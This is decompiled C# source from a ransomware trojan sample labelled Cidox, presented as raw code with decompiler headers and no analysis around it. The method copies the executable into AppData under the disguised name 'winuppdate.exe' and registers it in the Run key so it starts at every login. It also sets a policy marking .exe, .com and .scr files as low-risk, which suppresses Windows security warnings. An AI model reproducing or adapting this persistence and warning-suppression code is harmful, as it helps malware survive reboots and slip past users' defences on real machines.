// Decompiled with JetBrains decompiler
// Type: Pharming_v6.pharmnova
// Assembly: Pendencias, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CE3A4980-9956-4DF5-AF70-AAA224EEF3A0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Ransom.Win32.Cidox.mqr-9883cba8c0f6b9fcecde41989117c851ae6752e3444b152542eda9148fd906e8.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Pharming_v6.My;
using System;
using System.Reflection;

namespace Pharming_v6
{
  [StandardModule]
  internal sealed class pharmnova
  {
    public static void pharmnova()
    {
      try
      {
        MyProject.Computer.FileSystem.CopyFile(Assembly.GetExecutingAssembly().Location, Module1.appdata + "\\winuppdate\\winuppdate.exe", true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("WinUppdate", (object) ("\"" + Module1.appdata + "\\winuppdate\\winuppdate.exe\" -autorun"));
      Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations");
      Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations", true).SetValue("LowRiskFileTypes", (object) ".exe;.com;.scr");
    }
  }
}
